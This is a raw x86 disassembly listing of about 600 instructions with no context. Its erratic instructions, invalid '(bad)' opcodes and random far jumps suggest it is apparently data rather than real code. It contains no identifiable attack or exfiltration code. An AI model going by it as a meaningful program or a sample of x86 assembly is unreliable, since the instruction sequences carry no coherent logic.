  520922:	sbb    BYTE PTR [esi-0xa],0xd0
  520926:	popf   
  520927:	mov    al,0x65
  520929:	loopne 0x5208e2
  52092b:	lods   al,BYTE PTR ds:[esi]
  52092c:	test   eax,0x2d839a20
  520931:	cmp    ch,BYTE PTR [ecx-0xb775c9d]
  520937:	mov    cl,0xf1
  520939:	push   ecx
  52093a:	fsub   st,st(1)
  52093c:	scas   eax,DWORD PTR es:[edi]
  52093d:	das    
  52093e:	adc    ah,BYTE PTR [ebp-0x5b]
  520941:	cmp    DWORD PTR [ebx-0x6dcd3487],esi
  520947:	and    ebp,DWORD PTR [edi-0x49]
  52094a:	ins    DWORD PTR es:[edi],dx
  52094b:	in     eax,dx
  52094c:	and    eax,0xe2d927ef
  520951:	dec    esi
  520952:	jne    0x5208fb
  520954:	add    eax,0xcd10d0c7
  520959:	not    esi
  52095b:	pop    ds
  52095c:	jbe    0x5209b8
  52095e:	clc    
  52095f:	sti    
  520960:	and    bl,BYTE PTR [ecx]
  520962:	fldenv [edx-0x33]
  520965:	daa    
  520966:	aas    
  520967:	aaa    
  520968:	lods   al,BYTE PTR ds:[esi]
  520969:	jmp    0x76b2:0x3ee24f93
  520970:	mov    ebx,0xf69f9581
  520975:	rcl    DWORD PTR [ebp+0xc],0xc6
  520979:	call   0xc1ba:0x8471808a
  520980:	xchg   BYTE PTR [edi+0x40],ah
  520983:	outs   dx,BYTE PTR ds:[esi]
  520984:	xchg   esi,eax
  520985:	les    esi,FWORD PTR [eax+0x72]
  520988:	and    al,0x8e
  52098a:	fmul   DWORD PTR [edx+esi*8-0x1796d247]
  520991:	xor    eax,0xe0a4bb0e
  520996:	cmc    
  520997:	mov    al,ds:0xc659acd6
  52099c:	fisttp DWORD PTR [ebx+0x14dc739f]
  5209a2:	jl     0x5209af
  5209a4:	fistp  WORD PTR [edx]
  5209a6:	xor    eax,0x3a6b9bc6
  5209ab:	pop    edi
  5209ac:	clc    
  5209ad:	imul   ecx,DWORD PTR [ecx+0x194b36a5],0x3cfeace5
  5209b7:	mov    ds:0xfffe8e0d,al
  5209bc:	ss (bad) 
  5209be:	push   edi
  5209bf:	lahf   
  5209c0:	out    dx,al
  5209c1:	test   DWORD PTR [ecx+eiz*4-0xf1213d9],0x77267988
  5209cc:	add    al,BYTE PTR [esi]
  5209ce:	pushf  
  5209cf:	std    
  5209d0:	(bad)  
  5209d1:	into   
  5209d2:	jne    0x5209ec
  5209d4:	pusha  
  5209d5:	in     eax,0xbf
  5209d7:	out    0x23,eax
  5209d9:	xchg   ebp,eax
  5209da:	cs xor bh,al
  5209dd:	aam    0x50
  5209df:	test   edx,ebx
  5209e1:	cmp    edi,edi
  5209e3:	mov    ebx,0x9134d06e
  5209e8:	or     eax,0xe2bb9dde
  5209ed:	fsubr  DWORD PTR [ebx-0x15]
  5209f0:	inc    esi
  5209f1:	or     al,0xf7
  5209f3:	(bad)  
  5209f4:	and    DWORD PTR [eax],edi
  5209f6:	lds    ebx,FWORD PTR [ebx]
  5209f8:	ja     0x520a34
  5209fa:	fstp   QWORD PTR [edx+edi*2]
  5209fd:	daa    
  5209fe:	cdq    
  5209ff:	and    al,0x2a
  520a01:	pop    ds
  520a02:	popa   
  520a03:	dec    ebp
  520a04:	fwait
  520a05:	ret    0xe53b
  520a08:	arpl   WORD PTR ds:0xe6f32d2,dx
  520a0e:	push   ebp
  520a0f:	inc    ebp
  520a10:	aaa    
  520a11:	pop    edx
  520a12:	shr    BYTE PTR ds:0x11a472e5,cl
  520a18:	mov    WORD PTR [esp+eax*1+0x65db6212],es
  520a1f:	repz mov bl,BYTE PTR [ebp+0x721c6114]
  520a26:	dec    ecx
  520a27:	mov    ch,0xef
  520a29:	pop    esi
  520a2a:	jb     0x5209b0
  520a2c:	xor    bh,bl
  520a2e:	cmp    BYTE PTR [esi],bh
  520a30:	push   eax
  520a31:	pop    ss
  520a32:	or     bl,al
  520a34:	inc    ebx
  520a35:	aam    0x8a
  520a37:	xor    eax,0xabc34114
  520a3c:	pop    esp
  520a3d:	test   BYTE PTR [esi-0x1daec410],0xa1
  520a44:	xchg   edi,eax
  520a45:	stc    
  520a46:	int3   
  520a47:	stc    
  520a48:	nop
  520a49:	jbe    0x520a1d
  520a4b:	and    BYTE PTR [ecx-0x7d],bh
  520a4e:	fmul   QWORD PTR [edi]
  520a50:	cmp    DWORD PTR [edx],esp
  520a52:	or     ebx,0x4396fd00
  520a58:	scas   al,BYTE PTR es:[edi]
  520a59:	ins    DWORD PTR es:[edi],dx
  520a5a:	add    eax,0xc421f57e
  520a5f:	cmp    ah,BYTE PTR gs:[edx+0x638b5b9a]
  520a66:	push   edx
  520a67:	inc    ecx
  520a68:	fisub  WORD PTR [edx+0x5a]
  520a6b:	sub    DWORD PTR [eax],ebp
  520a6d:	aaa    
  520a6e:	leave  
  520a6f:	or     al,ch
  520a71:	pop    es
  520a72:	add    BYTE PTR [eax+0xc432d90],dh
  520a78:	jno    0x520ac7
  520a7a:	ja     0x520acc
  520a7c:	(bad)  
  520a7e:	cmc    
  520a7f:	push   es
  520a80:	mov    WORD PTR [edx+ebp*1],ss
  520a83:	lahf   
  520a84:	mov    eax,ds:0x2a3dc305
  520a89:	pop    ebx
  520a8a:	loopne 0x520a67
  520a8c:	pop    ebx
  520a8d:	or     ch,BYTE PTR [ebp-0x13b465f]
  520a93:	mov    DWORD PTR [ebx],ebp
  520a95:	push   ebx
  520a96:	sbb    eax,0x4691aad2
  520a9b:	sub    ah,ch
  520a9d:	pop    ebx
  520a9e:	and    eax,0x6826980f
  520aa3:	and    BYTE PTR [ebp-0x70e45d73],0xf1
  520aaa:	and    eax,0x9cfdfc67
  520aaf:	sub    al,0xca
  520ab1:	sbb    eax,DWORD PTR [esi-0x414a7b3b]
  520ab7:	(bad)  [esi-0x1a]
  520aba:	in     al,dx
  520abb:	scas   al,BYTE PTR es:[edi]
  520abc:	mov    dl,0xa1
  520abe:	dec    ecx
  520abf:	mov    dl,0x5c
  520ac1:	or     ebp,edx
  520ac3:	aad    0x46
  520ac5:	and    dh,BYTE PTR [eax-0x1d]
  520ac8:	ja     0x520af1
  520aca:	aaa    
  520acb:	push   edx
  520acc:	mov    dh,0xc8
  520ace:	lods   al,BYTE PTR ds:[esi]
  520acf:	sbb    BYTE PTR [edx-0x306897c5],al
  520ad5:	(bad)  
  520ad8:	mov    eax,0xa5c87bb8
  520add:	cmp    al,0x7e
  520adf:	cmp    ebp,DWORD PTR [edi]
  520ae1:	xchg   esi,eax
  520ae2:	out    0x7,al
  520ae4:	jb     0x520b35
  520ae6:	pop    es
  520ae7:	xchg   esp,eax
  520ae8:	sbb    DWORD PTR [ecx+0x4f],edi
  520aeb:	fbstp  TBYTE PTR [edx-0x11]
  520aee:	mov    ds:0x71bd6dd7,al
  520af3:	pop    ss
  520af4:	push   cs
  520af5:	or     eax,0x4bc7f7a0
  520afa:	fcmovbe st,st(4)
  520afc:	mov    DWORD PTR [edi+eiz*1+0x4cf1de48],eax
  520b03:	ficom  DWORD PTR [eax-0x5b]
  520b06:	adc    al,0x69
  520b08:	pop    ss
  520b09:	inc    BYTE PTR [ebp+0x16]
  520b0c:	stc    
  520b0d:	pop    eax
  520b0e:	xchg   ecx,eax
  520b0f:	cmp    esp,edi
  520b11:	and    DWORD PTR [ecx+0x2af929e5],esp
  520b17:	fwait
  520b18:	adc    eax,0xf91226aa
  520b1d:	xor    eax,DWORD PTR [edx-0x53025eca]
  520b23:	mov    bh,0x69
  520b25:	xchg   bh,bh
  520b27:	mov    ebp,0x15f08f87
  520b2c:	inc    BYTE PTR [eax-0x52]
  520b2f:	and    ebp,DWORD PTR [eax]
  520b31:	adc    ebx,esi
  520b33:	clc    
  520b34:	jns    0x520b54
  520b36:	(bad)  
  520b37:	dec    ebx
  520b38:	jp     0x520bac
  520b3a:	jecxz  0x520bb3
  520b3c:	inc    ebx
  520b3d:	mov    esi,0x2aaffc58
  520b42:	std    
  520b43:	arpl   WORD PTR [esi+0x32],bx
  520b46:	inc    ecx
  520b47:	cmp    edi,DWORD PTR [ebx+0x10ec2ca6]
  520b4d:	jo     0x520b95
  520b4f:	adc    DWORD PTR [edx],ebx
  520b51:	pop    eax
  520b52:	popf   
  520b53:	fcomip st,st(2)
  520b55:	fsub   QWORD PTR [ebx-0x59]
  520b58:	and    eax,0xa398dd3e
  520b5d:	jb     0x520b09
  520b5f:	or     BYTE PTR [edi-0x45],dl
  520b62:	xorps  xmm6,XMMWORD PTR [esi-0x52]
  520b66:	mov    BYTE PTR [esi-0x2f],dl
  520b69:	pushf  
  520b6a:	push   esp
  520b6b:	into   
  520b6c:	mov    eax,0xfa13e97d
  520b71:	test   al,0x7a
  520b73:	mov    cl,0x38
  520b75:	push   ebx
  520b76:	loopne 0x520b7d
  520b78:	inc    ebx
  520b79:	loopne 0x520bc7
  520b7b:	pusha  
  520b7c:	ror    BYTE PTR [esi+edx*2+0x7b65f8c4],1
  520b83:	push   ds
  520b84:	and    al,0x8
  520b86:	inc    ebp
  520b87:	pop    ds
  520b88:	bound  eax,QWORD PTR [ebx]
  520b8a:	arpl   sp,cx
  520b8c:	jo     0x520b27
  520b8e:	aam    0x40
  520b90:	sbb    cl,dh
  520b92:	pop    ebx
  520b93:	jle    0x520b5e
  520b95:	test   al,0x9d
  520b97:	sub    DWORD PTR [edi+0x3da14180],esp
  520b9d:	repz xchg ecx,eax
  520b9f:	loopne 0x520c04
  520ba1:	xor    bl,ch
  520ba3:	rol    BYTE PTR [eax],0x3
  520ba6:	mov    bh,0xad
  520ba8:	pop    eax
  520ba9:	es (bad) 
  520bab:	add    ch,BYTE PTR [di+0x4a1f]
  520bb0:	ins    DWORD PTR es:[edi],dx
  520bb1:	pop    edx
  520bb2:	mov    al,ds:0xd3145bc7
  520bb7:	xor    eax,0x8f8cc85
  520bbc:	push   eax
  520bbd:	mov    bl,0xb3
  520bbf:	shr    al,1
  520bc1:	cli    
  520bc2:	and    ebx,DWORD PTR [esp+ebx*8+0x25a53fd8]
  520bc9:	xor    DWORD PTR [ebp-0x7],edx
  520bcc:	std    
  520bcd:	fnstenv [ecx]
  520bcf:	(bad)  
  520bd0:	jnp    0x520bf3
  520bd2:	sub    al,0x85
  520bd4:	mov    ah,0x4d
  520bd6:	les    edx,FWORD PTR [ebp+0x55]
  520bd9:	xchg   BYTE PTR [eax-0x7c015333],ah
  520bdf:	jg     0x520b81
  520be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  520be2:	ds dec ebp
  520be4:	neg    BYTE PTR [eax+edi*2]
  520be7:	dec    ebp
  520be8:	add    bh,BYTE PTR [eax]
  520bea:	jne    0x520b86
  520bec:	scas   eax,DWORD PTR es:[edi]
  520bed:	sub    bl,BYTE PTR [eiz*8+0x2f567900]
  520bf4:	mov    ch,0x6a
  520bf6:	arpl   WORD PTR [edi],bx
  520bf8:	dec    edx
  520bf9:	xor    DWORD PTR [eax],esp
  520bfb:	cmp    DWORD PTR [ebx],ebp
  520bfd:	jmp    0x3688:0xb89eadb6
  520c04:	jo     0x520c0b
  520c06:	adc    DWORD PTR [edx-0x2f7ba8b],0xffffff8e
  520c0d:	pushf  
  520c0e:	push   esp
  520c0f:	inc    edx
  520c10:	jbe    0x520c85
  520c12:	mov    BYTE PTR [esi+0x5a080aa5],dl
  520c18:	ins    DWORD PTR es:[edi],dx
  520c19:	aam    0x4b
  520c1b:	inc    eax
  520c1c:	add    ah,BYTE PTR [esi-0x5b]
  520c1f:	cmp    al,0xad
  520c21:	loope  0x520c5c
  520c23:	jne    0x520bf1
  520c25:	in     eax,dx
  520c26:	popf   
  520c27:	or     eax,0xbdc32e6f
  520c2c:	repz aas 
  520c2e:	add    BYTE PTR [edx],dl
  520c30:	jp     0x520bcb
  520c32:	out    dx,al
  520c33:	push   esp
  520c34:	imul   ebp,DWORD PTR [edi-0x6b],0xb543f779
  520c3b:	outs   dx,BYTE PTR ds:[esi]
  520c3c:	rol    BYTE PTR [esi+0x79f1b24c],1
  520c42:	fcomi  st,st(7)
  520c44:	sbb    BYTE PTR [ebp+0x2877fd52],bh
  520c4a:	sbb    al,0xac
  520c4c:	data16 out dx,al
  520c4e:	mov    ch,dh
  520c50:	loopne 0x520bf6
  520c52:	jb     0x520c10
  520c54:	imul   edx,DWORD PTR [esi],0x68
  520c57:	ret    0x191a
  520c5a:	in     al,0x62
  520c5c:	fisubr DWORD PTR [edi]
  520c5e:	or     eax,0xe14bfc3c
  520c63:	pop    ebp
  520c64:	in     al,dx
  520c65:	jne    0x520c9f
  520c67:	mov    dh,BYTE PTR [ecx+0x28]
  520c6a:	jns    0x520c2e
  520c6c:	add    DWORD PTR [ecx-0x15],esi
  520c6f:	sub    DWORD PTR [edi+0x2ff0fa67],esp
  520c75:	repnz and esp,0xffffff91
  520c79:	imul   eax,ecx,0x24
  520c7c:	pop    ebp
  520c7d:	imul   edi,esp,0xa5802cc1
  520c83:	je     0x520c34
  520c85:	rcl    DWORD PTR [ebp+0x26],cl
  520c88:	cmp    bl,bl
  520c8a:	sub    eax,0x997a6c48
  520c8f:	dec    edi
  520c90:	jle    0x520cfe
  520c92:	lods   al,BYTE PTR ds:[esi]
  520c93:	mov    ds:0xb51117cb,eax
  520c98:	jno    0x520cd8
  520c9a:	mov    WORD PTR [edx],ss
  520c9c:	pop    ds
  520c9d:	mov    edi,0x9b426a53
  520ca2:	cmc    
  520ca3:	inc    edi
  520ca4:	cli    
  520ca5:	fnsave [eax+ecx*1-0x46]
  520ca9:	push   ebx
  520caa:	addr16 std 
  520cac:	adc    ecx,DWORD PTR [ebx+0x3cd10d5d]
  520cb2:	push   edx
  520cb3:	mov    esp,0x710c1668
  520cb8:	adc    eax,0xc94f5d37
  520cbd:	sahf   
  520cbe:	add    al,0x64
  520cc0:	lahf   
  520cc1:	gs adc BYTE PTR ds:[edi+ecx*8+0x5],bh
  520cc7:	dec    ecx
  520cc8:	ret    0x1bbf
  520ccb:	sub    esi,esp
  520ccd:	mov    edx,0xb7ca55da
  520cd2:	sbb    al,0xc9
  520cd4:	das    
  520cd5:	add    ah,BYTE PTR [ecx-0x26]
  520cd8:	xchg   BYTE PTR [esi+ecx*2+0x42048d08],cl
  520cdf:	mov    WORD PTR [edi],ds
  520ce1:	rcl    DWORD PTR [esi],1
  520ce3:	inc    edi
  520ce4:	stos   BYTE PTR es:[edi],al
  520ce5:	repz je 0x520d03
  520ce8:	pop    es
  520ce9:	mov    edi,0x313b6cc3
  520cee:	mov    eax,0xe41bec01
  520cf3:	outs   dx,BYTE PTR ds:[esi]
  520cf4:	pop    edi
  520cf5:	pop    esi
  520cf6:	test   BYTE PTR [eax],bh
  520cf8:	xchg   ebx,eax
  520cf9:	mov    ebp,0x6d580263
  520cfe:	loope  0x520c96
  520d00:	lock dec ebp
  520d02:	fiadd  DWORD PTR ds:0x6006420c
  520d08:	int    0x31
  520d0a:	lds    ebp,FWORD PTR [esi+0x43]
  520d0d:	lods   al,BYTE PTR ds:[esi]
  520d0e:	scas   al,BYTE PTR es:[edi]
  520d0f:	gs dec esp
  520d11:	in     al,dx
  520d12:	std    
  520d13:	clc    
  520d14:	out    dx,eax
  520d15:	mov    eax,0x33c1f5ae
  520d1a:	add    al,BYTE PTR [esi+0x16]
  520d1d:	inc    edx
  520d1e:	xor    bl,bh
  520d20:	ror    dh,0xf4
  520d23:	lahf   
  520d24:	jns    0x520d92
  520d26:	inc    ebx
  520d27:	pop    esi
  520d28:	push   es
  520d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  520d2a:	(bad)  
  520d2b:	bound  ebx,QWORD PTR [eax-0x35]
  520d2e:	cmp    al,0x88
  520d30:	pop    ebx
  520d31:	push   ebx
  520d32:	or     eax,0xd1497f0d
  520d37:	repz loope 0x520d18
  520d3a:	cli    
  520d3b:	jo     0x520d17
  520d3d:	dec    ebp
  520d3e:	sbb    al,BYTE PTR [edi]
  520d40:	sub    ch,ch
  520d42:	dec    ecx
  520d43:	add    ah,bh
  520d45:	in     eax,0xce
  520d47:	add    eax,0xe51f708a
  520d4c:	popa   
  520d4d:	(bad)  
  520d4e:	popa   
  520d4f:	xor    eax,0x7b0ef71d
  520d54:	in     eax,0x71
  520d56:	xchg   ebx,eax
  520d57:	dec    ebp
  520d58:	push   ebp
  520d59:	pop    ecx
  520d5a:	pop    edx
  520d5b:	(bad)  
  520d5c:	repnz test ah,bl
  520d5f:	iret   
  520d60:	daa    
  520d61:	pop    ebx
  520d62:	fcomp  QWORD PTR [ecx]
  520d64:	test   eax,0x55af83d8
  520d69:	inc    esi
  520d6a:	inc    eax
  520d6b:	shr    DWORD PTR [edx+esi*2+0x70aa535e],1
  520d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  520d73:	clc    
  520d74:	mov    cl,0x99
  520d76:	mov    ebx,0x8e7d16d9
  520d7b:	jmp    0xfa48f248
  520d80:	in     eax,0xc0
  520d82:	sub    DWORD PTR [ebx],eax
  520d84:	push   ss
  520d85:	sub    DWORD PTR [ecx+0x67],ebp
  520d88:	jmp    0x520d32
  520d8a:	fld    QWORD PTR [edi]
  520d8c:	mov    esp,0x209c06b3
  520d91:	out    0x25,ax
  520d94:	ret    
  520d95:	cld    
  520d96:	jmp    0x9571:0x7f1494f8
  520d9d:	xor    eax,0x21a49a43
  520da2:	adc    eax,0xf7d76c38
  520da7:	or     al,0x8e
  520da9:	aad    0xb2
  520dab:	test   esp,esp
  520dad:	mov    edx,?
  520daf:	popf   
  520db0:	test   DWORD PTR [eax+0x3a0fdd60],0x38ba59b4
  520dba:	xor    esp,DWORD PTR [eax+0x1b58be68]
  520dc0:	int3   
  520dc1:	pop    edi
  520dc2:	pop    si
  520dc4:	push   edx
  520dc5:	mov    DWORD PTR [esp+edi*4+0x7c],ecx
  520dc9:	cmp    dl,bl
  520dcb:	lock in al,0x41
  520dce:	add    ah,bh
  520dd0:	sbb    edx,esp
  520dd2:	lds    edi,FWORD PTR ds:0x9b435521
  520dd8:	out    0x45,eax
  520dda:	dec    edi
  520ddb:	mov    ah,0x87
  520ddd:	pop    ebx
  520dde:	in     eax,dx
  520ddf:	(bad)  
  520de0:	xor    eax,ebp
  520de2:	xchg   esp,eax
  520de3:	int3   
  520de4:	lods   al,BYTE PTR ds:[esi]
  520de5:	sbb    DWORD PTR [esi-0x47],ebx
  520de8:	repnz lahf 
  520dea:	les    edi,FWORD PTR [esi]
  520dec:	jecxz  0x520e0e
  520dee:	or     DWORD PTR ds:0xfe1ba8f3,esi
  520df4:	hlt    
  520df5:	inc    ecx
  520df6:	ret    
  520df7:	dec    edx
  520df8:	or     ch,BYTE PTR [esi+0x18]
  520dfb:	iret   
  520dfc:	mov    BYTE PTR gs:[ecx-0x73],bl
  520e00:	pop    ecx
  520e01:	fcom   DWORD PTR [eax+0x3b]
  520e04:	shl    BYTE PTR ds:0x4a6aa85f,cl
  520e0a:	ja     0x520df9
  520e0c:	jae    0x520d92
  520e0e:	mov    al,ds:0x1d1c10cd
  520e13:	add    eax,DWORD PTR [edx]
  520e15:	(bad)  
  520e16:	out    dx,al
  520e17:	into   
  520e18:	pop    edi
  520e19:	shl    edi,1
  520e1b:	loop   0x520e03
  520e1d:	mov    BYTE PTR [eax],dh
  520e1f:	lods   eax,DWORD PTR ds:[esi]
  520e20:	clc    
  520e21:	push   bx
  520e23:	aaa    
  520e24:	ficomp WORD PTR [edi]
  520e26:	sbb    bh,dl
  520e28:	pushf  
  520e29:	mov    al,0x75
  520e2b:	jmp    0x749c:0x65f1f6e7
  520e32:	std    
  520e33:	mov    al,0x5f
  520e35:	sub    ch,BYTE PTR [ecx+ecx*8-0x7e7c2de1]
  520e3c:	outs   dx,BYTE PTR ds:[esi]
  520e3d:	in     eax,dx
  520e3e:	sub    dl,ch
  520e40:	inc    eax
  520e41:	outs   dx,DWORD PTR ds:[esi]
  520e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  520e43:	sub    ebx,DWORD PTR [esi+eiz*2-0x490ceebd]
  520e4a:	mov    edx,0x5605f3f9
  520e4f:	xchg   ebx,eax
  520e50:	and    DWORD PTR [ecx+0x7900457b],ebx
  520e56:	mov    cl,0x43
  520e58:	stc    
  520e59:	push   ecx
  520e5a:	xor    ebp,DWORD PTR [edx]
  520e5c:	sbb    DWORD PTR [edi+0x6d28836e],edx
  520e62:	jmp    DWORD PTR [ebx+ebx*8]
  520e65:	pop    ss
  520e66:	xchg   edi,eax
  520e67:	xchg   esi,eax
  520e68:	jecxz  0x520ee9
  520e6a:	jno    0x520e8f
  520e6c:	mov    ebp,0x93379462
  520e71:	loopne 0x520e30
  520e73:	pop    ss
  520e74:	mov    ecx,0x681120cf
  520e79:	xchg   edx,eax
  520e7a:	mov    WORD PTR [ebp+0x15fa894e],cs
  520e80:	iret   
  520e81:	clc    
  520e82:	outs   dx,DWORD PTR ds:[esi]
  520e83:	cs cdq 
  520e85:	add    DWORD PTR [eax],edx
  520e87:	scas   al,BYTE PTR es:[edi]
  520e88:	fisubr DWORD PTR [esi]
  520e8a:	(bad)  
  520e8b:	cmc    
  520e8c:	xchg   ecx,eax
  520e8d:	jb     0x520ef7
  520e8f:	stos   BYTE PTR es:[edi],al
  520e90:	cmc    
  520e91:	and    DWORD PTR [ebx+0x4b3bcc78],edi
  520e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  520e98:	pop    ecx
  520e99:	sub    ecx,ebx
  520e9b:	fwait
  520e9c:	fs or  al,0x56
  520e9f:	iret   
  520ea0:	retf   0x84dd
  520ea3:	ins    DWORD PTR es:[edi],dx
  520ea4:	outs   dx,DWORD PTR ds:[esi]
  520ea5:	addr16 lahf 
  520ea7:	dec    edi
  520ea8:	into   
  520ea9:	(bad)  
  520eaa:	push   ebx
  520eab:	sbb    ebp,DWORD PTR [esi+0x55d8750c]
  520eb1:	jecxz  0x520e72
  520eb3:	jnp    0x520f29
  520eb5:	mov    ds:0x57bd1efa,eax
  520eba:	xlat   BYTE PTR ds:[ebx]
  520ebb:	adc    edx,ebx
  520ebd:	adc    BYTE PTR [ecx+0x1f9d5149],al
  520ec3:	dec    eax
  520ec4:	dec    esp
  520ec5:	jmp    0x520f26
  520ec7:	push   es
  520ec8:	mov    bh,0x5e
  520eca:	mov    ebp,0xaaba139d
  520ecf:	xchg   BYTE PTR [eax-0x2c],ah
  520ed2:	lods   al,BYTE PTR ds:[esi]
  520ed3:	(bad)  
  520ed4:	fs pop ebx
  520ed6:	clc    
  520ed7:	mov    eax,ds:0x4bdb96e9
  520edc:	push   eax
  520edd:	loopne 0x520f29
  520edf:	leave  
  520ee0:	xor    cl,al
  520ee2:	inc    ebx
  520ee3:	mov    BYTE PTR [ebp-0x13],dh
  520ee6:	and    cl,BYTE PTR [ebx]
  520ee8:	mov    ds:0x41079ed2,eax
  520eed:	jno    0x520ec1
  520eef:	bound  ecx,QWORD PTR [ecx-0x5e30593a]
  520ef5:	mov    ?,WORD PTR [esi]
  520ef7:	out    0x1a,eax
  520ef9:	shl    BYTE PTR [edi-0x49],1
  520efc:	cli    
  520efd:	scas   al,BYTE PTR es:[edi]
  520efe:	cld    
  520eff:	rcr    DWORD PTR [edi+0x7d0d8735],cl
  520f05:	cmc    
  520f06:	lahf   
  520f07:	inc    ebp
  520f08:	dec    ecx
  520f09:	in     al,0xc
  520f0b:	push   eax
  520f0c:	std    
  520f0d:	jb     0x520f35
  520f0f:	fidiv  DWORD PTR [edi-0x3aa23e41]
  520f15:	or     eax,0xcde3e78
  520f1a:	mov    dh,0x38
  520f1c:	scas   eax,DWORD PTR es:[edi]
  520f1d:	test   DWORD PTR [bx+si-0x154b],ebp
  520f22:	repz dec eax
  520f24:	dec    esp
  520f25:	std    
  520f26:	dec    DWORD PTR ds:0xa631214a
  520f2c:	sub    ebp,DWORD PTR [edi-0x268ea698]
  520f32:	xor    ebp,esi
  520f34:	popa   
  520f35:	push   edx
  520f36:	xor    bl,dh
  520f38:	lahf   
  520f39:	cli    
  520f3a:	or     eax,eax
  520f3c:	pushf  
  520f3d:	fs std 
  520f3f:	jnp    0x520f38
  520f41:	ds jb  0x520f65
  520f44:	xlat   BYTE PTR ds:[ebx]
  520f45:	lea    edx,[eax]
  520f47:	push   ss
  520f48:	jmp    0x3e81f32d
  520f4d:	shr    esi,1
  520f4f:	pushf  
  520f50:	inc    ecx
  520f51:	xchg   esi,eax
  520f52:	das    
  520f53:	or     BYTE PTR [eax+0x5f],0xb
  520f57:	lahf   
  520f58:	icebp  
  520f59:	aam    0xff
  520f5b:	mov    WORD PTR [ecx-0x1e],ds
  520f5e:	sbb    eax,0xdd6ffca4
  520f63:	and    BYTE PTR [ecx-0xd105b9e],bl
  520f69:	xchg   DWORD PTR [ebx+0x646990d6],ebp
  520f6f:	gs (bad) 
  520f71:	cdq    
  520f72:	dec    ebp
  520f73:	or     BYTE PTR [ecx+0xe],dl
  520f76:	or     eax,0x56c320d1
  520f7b:	popf   
  520f7c:	aas    
  520f7d:	adc    esp,eax
  520f7f:	and    dh,BYTE PTR [ebp+0x4a628620]
  520f85:	stos   DWORD PTR es:[edi],eax
  520f86:	ins    DWORD PTR es:[edi],dx
  520f87:	fist   DWORD PTR [ebp+0x5295cb4c]
  520f8d:	stos   BYTE PTR es:[edi],al
  520f8e:	and    BYTE PTR [ebp-0x5b4ee881],0x5a
  520f95:	cs jmp 0x1ed:0xf070b57f
  520f9d:	sub    al,0x4
  520f9f:	js     0x520fcb
  520fa1:	pop    ecx
  520fa2:	js     0x520f4a
  520fa4:	pop    edi
  520fa5:	mov    ebp,0x25e76575
  520faa:	sbb    DWORD PTR [ebx+0x5b5230df],edi
  520fb0:	pop    esp
  520fb1:	ins    BYTE PTR es:[edi],dx
  520fb2:	mov    ch,0xec
  520fb4:	stos   BYTE PTR es:[edi],al
  520fb5:	mov    esi,0x8d1856ea
  520fba:	jno    0x520f5d
  520fbc:	mov    ?,WORD PTR [ebp-0x477e866c]
  520fc2:	cli    
  520fc3:	out    0x12,al
  520fc5:	scas   eax,DWORD PTR es:[edi]
  520fc6:	(bad)  
  520fc7:	adc    DWORD PTR [eax+0xf5d8f5f],ebp
  520fcd:	icebp  
  520fce:	out    dx,al
  520fcf:	xor    al,0x84
  520fd1:	or     eax,0x1f1b0122
  520fd7:	adc    BYTE PTR [ebx],ah
  520fd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  520fda:	in     eax,0xd9
  520fdc:	dec    edx
  520fdd:	stos   DWORD PTR es:[edi],eax
  520fde:	adc    BYTE PTR [esi+0x3e],al
  520fe1:	retf   
  520fe2:	push   es
  520fe3:	pop    es
  520fe4:	mov    WORD PTR [esi],es
  520fe6:	popf   
  520fe7:	fisub  WORD PTR [ebx+edi*1+0x85c1008]
  520fee:	push   es
  520fef:	push   esp
  520ff0:	mov    eax,ds:0x704e1591
  520ff5:	in     al,dx
  520ff6:	daa    
  520ff7:	ins    BYTE PTR es:[edi],dx
  520ff8:	div    DWORD PTR [edx]
  520ffa:	fidiv  WORD PTR [esi-0x7]
  520ffd:	mov    al,0x27
  520fff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  521000:	dec    ecx
  521001:	cmp    eax,0x8b2c3ace
  521006:	imul   esp,ebx,0x8f539d5f
  52100c:	cmp    DWORD PTR [eax],ebx
  52100e:	mov    eax,0xaaa3c709
  521013:	ficomp WORD PTR [ebp-0x936cac7]
  521019:	cmp    eax,0x1271406d
  52101e:	pusha  
  52101f:	pop    esp
  521020:	xchg   esp,edi
  521022:	add    bh,BYTE PTR [edx]
  521024:	jnp    0x520fe0
  521026:	jge    0x520fcf
  521028:	sub    eax,0xe8dbd971
  52102d:	loope  0x520fef
  52102f:	(bad)  
  521030:	dec    eax
  521031:	mov    ecx,0x902dd451
  521036:	sti    
  521037:	call   0xb9084779
  52103c:	std    
  52103d:	jae    0x520fed
  52103f:	stc    
  521040:	fisub  DWORD PTR ds:0x6c76f531
  521046:	(bad)  
  521047:	repnz xchg ecx,eax
  521049:	aad    0x4
  52104b:	inc    ebx
  52104c:	lar    esi,bx
  52104f:	xchg   ecx,eax
  521050:	jl     0x521002
  521052:	ret    
  521053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  521054:	cmp    eax,0x15603529
  521059:	jp     0x521097
  52105b:	inc    ebx
  52105c:	sbb    DWORD PTR [eax+0x54f1ad1e],0xfffffffe
  521063:	hlt    
  521064:	aad    0xa3
  521066:	adc    al,0xbd
  521068:	cwde   
  521069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52106a:	inc    ebx
  52106b:	pop    ss
  52106c:	push   ds
  52106d:	sar    BYTE PTR [esi-0x271a9904],cl
  521073:	ret    0x7fcf
  521076:	push   ds
  521077:	xchg   ebp,eax
  521078:	fs mov ecx,0xf67734b3
  52107e:	sub    eax,0x707f959a
  521083:	cmc    
  521084:	jmp    0x52100e
  521086:	xchg   ebx,eax
  521087:	adc    bh,bh
  521089:	mov    cl,BYTE PTR [edx]
  52108b:	add    BYTE PTR [ebx-0x3b],bl
  52108e:	inc    eax
  52108f:	test   al,0x5f
  521091:	add    eax,0xe9c4f028
  521096:	pop    ebp
  521097:	jle    0x521064
  521099:	lods   eax,DWORD PTR ds:[esi]
  52109a:	das    
  52109b:	enter  0x8d87,0x34
  52109f:	in     eax,0x5d
  5210a1:	xchg   edx,eax
  5210a2:	icebp  
  5210a3:	pop    ebp
  5210a4:	sbb    eax,0xa141eac
  5210a9:	(bad)  [edx+edi*4]
  5210ac:	and    ah,BYTE PTR [ecx+0x3e]
  5210af:	rol    BYTE PTR [edi],cl
  5210b1:	or     eax,0x9ab51112
